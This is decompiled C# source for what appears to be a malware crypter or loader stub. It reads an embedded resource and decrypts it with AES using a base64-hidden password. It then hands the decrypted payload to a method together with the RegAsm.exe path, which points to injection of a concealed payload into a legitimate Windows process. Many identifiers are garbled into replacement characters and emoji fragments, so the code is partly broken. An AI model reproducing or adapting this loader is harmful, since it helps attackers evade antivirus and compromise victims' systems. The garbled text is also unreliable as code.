using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

// Token: 0x02000002 RID: 2
internal static class WeirdShit1
{
	// Token: 0x06000001 RID: 1 RVA: 0x00002508 File Offset: 0x00000708
	public static void WeirdShit1Method()
	{
		byte[] Byte1 = WeirdShit1.ArrayTingy(Encoding.UTF8.GetString(Convert.FromBase64String("TGhTNVgwbDlLUG5IZDZOVnBkdGJHYUVTZw=="))); 
		byte[] Byte2 = WeirdShit1.WeirdShit2(Byte1, Encoding.UTF8.GetString(Convert.FromBase64String("ZnpHM0h2clFFNUl5MzAyWE0xUUg3OEdxcQ==")));
		WhatTheFuckIsThis.WhatTheFuckIsThisMethod(Encoding.UTF8.GetString(Convert.FromBase64String("QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XFJlZ0FzbS5leGU=")), Byte2, false);
	}

	// Token: 0x06000002 RID: 2 RVA: 0x0000256C File Offset: 0x0000076C
	public static byte[] ArrayTingy(string by-unknown\uD83C\uDD74\uFFFD\uFFFD\uD83D\uDDE8\uD83C\uDD74\uFFFD\uFFFD\uFFFD\uD83E\uDD15\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDD35\uFFFD\uD83E\uDD75\uFFFD\uD83D\uDEC1)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		byte[] result;
		using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(by-unknown\uD83C\uDD74\uFFFD\uFFFD\uD83D\uDDE8\uD83C\uDD74\uFFFD\uFFFD\uFFFD\uD83E\uDD15\uFFFD\uFFFD\uFFFD\uFFFD\uD83D\uDD35\uFFFD\uD83E\uDD75\uFFFD\uD83D\uDEC1))
		{
			if (manifestResourceStream == null)
			{
				result = null;
			}
			else
			{
				byte[] array = new byte[manifestResourceStream.Length];
				manifestResourceStream.Read(array, 0, array.Length);
				result = array;
			}
		}
		return result;
	}

	// Token: 0x06000003 RID: 3 RVA: 0x000025DC File Offset: 0x000007DC
	private static byte[] WeirdShit2(byte[] by-unknown\uD83E\uDF2B\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDE35\uFFFD\uFE0F\uFFFD\uFFFD\uD83D\uDD2D\uFFFD\uD83D\uDEC1\uD83D\uDD75\uFFFD\u200D\uFFFD\uFFFD\uFFFD, string by-unknown\uFFFD\uD83E\uDD15\uFFFD\uD83D\uDFFC\u200D\uFFFD\uFFFD\uD83D\uDD15\uFE0F\u200D\uFFFD\uD83D\uDD74\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFE0F\uD83D\uDD75)
	{
		return WeirdShit1.by-unknown\uD83E\uDD29\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uD83C\uDFFC\u200D\u26A7\uFFFD\uFFFD\uD83E\uDEA0\uFFFD\uFE0F\uFFFD\u200D\uFFFD\uFFFD\uFE0F\u200D\uFFFD\uFFFD(by-unknown\uD83E\uDF2B\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uD83E\uDE35\uFFFD\uFE0F\uFFFD\uFFFD\uD83D\uDD2D\uFFFD\uD83D\uDEC1\uD83D\uDD75\uFFFD\u200D\uFFFD\uFFFD\uFFFD, by-unknown\uFFFD\uD83E\uDD15\uFFFD\uD83D\uDFFC\u200D\uFFFD\uFFFD\uD83D\uDD15\uFE0F\u200D\uFFFD\uD83D\uDD74\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD\uFE0F\uD83D\uDD75);
	}

	// Token: 0x06000004 RID: 4 RVA: 0x000025F8 File Offset: 0x000007F8
	public static byte[] by-unknown\uD83E\uDD29\uFFFD\uFFFD\uFFFD\u200D\uFFFD\uD83C\uDFFC\u200D\u26A7\uFFFD\uFFFD\uD83E\uDEA0\uFFFD\uFE0F\uFFFD\u200D\uFFFD\uFFFD\uFE0F\u200D\uFFFD\uFFFD(byte[] by-unknown\uFFFD\uD83D\uDD70\uD83D\uDE35\uFFFD\uFFFD\u2642\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDD74\uFFFD\uFFFD\uFFFD\uD83D\uDD14\uD83E\uDD29\uFFFD\u26A7\u2642\uFFFD, string by-unknown\uFFFD\uFFFD\u2642\uFFFD\uD83D\uDEC1\uFFFD\uFE0F\uD83E\uDEC1\uD83D\uDFF3\uD83E\uDEC1\uFFFD\uFFFD\uFFFD\u200D\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD)
	{
		byte[] result = null;
		byte[] salt = new byte[]
		{
			26,
			20,
			202,
			234,
			136,
			123,
			69,
			47
		};
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				byte[] bytes = Encoding.UTF8.GetBytes(by-unknown\uFFFD\uFFFD\u2642\uFFFD\uD83D\uDEC1\uFFFD\uFE0F\uD83E\uDEC1\uD83D\uDFF3\uD83E\uDEC1\uFFFD\uFFFD\uFFFD\u200D\uFE0F\uFFFD\uFFFD\uFFFD\uFE0F\uFFFD\uFFFD);
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(by-unknown\uFFFD\uD83D\uDD70\uD83D\uDE35\uFFFD\uFFFD\u2642\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDD74\uFFFD\uFFFD\uFFFD\uD83D\uDD14\uD83E\uDD29\uFFFD\u26A7\u2642\uFFFD, 0, by-unknown\uFFFD\uD83D\uDD70\uD83D\uDE35\uFFFD\uFFFD\u2642\uFFFD\uFE0F\uFFFD\uFFFD\uD83C\uDD74\uFFFD\uFFFD\uFFFD\uD83D\uDD14\uD83E\uDD29\uFFFD\u26A7\u2642\uFFFD.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
		}
		return result;
	}
}
